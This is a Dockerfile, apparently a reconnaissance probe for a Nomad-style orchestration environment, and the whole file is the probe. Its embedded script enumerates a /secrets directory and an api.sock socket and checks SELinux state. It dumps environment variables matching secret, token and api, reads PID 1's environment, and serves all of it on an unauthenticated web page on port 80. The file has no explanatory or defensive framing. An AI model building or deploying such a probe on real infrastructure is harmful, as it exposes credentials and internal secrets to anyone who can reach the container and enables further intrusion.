FROM alpine:3.20
RUN apk add --no-cache busybox-extras
RUN printf '%s\n' \
'#!/bin/sh' \
'OUT=/www/index.html' \
'mkdir -p /www' \
'{' \
'echo "### ID"; id 2>&1; echo' \
'echo "### SELINUX"; getenforce 2>&1; cat /sys/fs/selinux/enforce 2>&1; echo' \
'echo "### LS_SECRETS"; ls -la /secrets/ 2>&1; echo' \
'echo "### LS_Z_SECRETS"; ls -laZ /secrets/ 2>&1; echo' \
'echo "### STAT_API_SOCK"; stat /secrets/api.sock 2>&1; echo' \
'echo "### STAT_Z_API_SOCK"; stat -c "%n type=%F mode=%a uid=%u gid=%g" /secrets/api.sock 2>&1; echo' \
'echo "### PROC_NET_UNIX_MATCHES"; grep -i -E "api\.sock|nomad|/secrets" /proc/net/unix 2>&1; echo' \
'echo "### PROC_NET_UNIX_TOTAL"; wc -l /proc/net/unix 2>&1; echo' \
'echo "### PROC_NET_UNIX_HEAD"; head -5 /proc/net/unix 2>&1; echo' \
'echo "### NOMAD_ENV"; env | grep -i -E "nomad|secret|token|api" 2>&1; echo' \
'echo "### PROC_1_ENV"; tr "\000" "\n" < /proc/1/environ 2>&1; echo' \
'echo "### WALK_SECRETS"; find /secrets -mindepth 1 2>&1 | while read f; do echo "ENTRY: $f"; ls -la "$f" 2>&1; done; echo' \
'echo "### MOUNT_SECRETS"; grep -E "secret|nomad" /proc/mounts 2>&1; echo' \
'} > "$OUT" 2>&1' \
'exec httpd -f -p 80 -h /www' \
> /probe.sh && chmod +x /probe.sh
EXPOSE 80
CMD ["/bin/sh", "/probe.sh"]
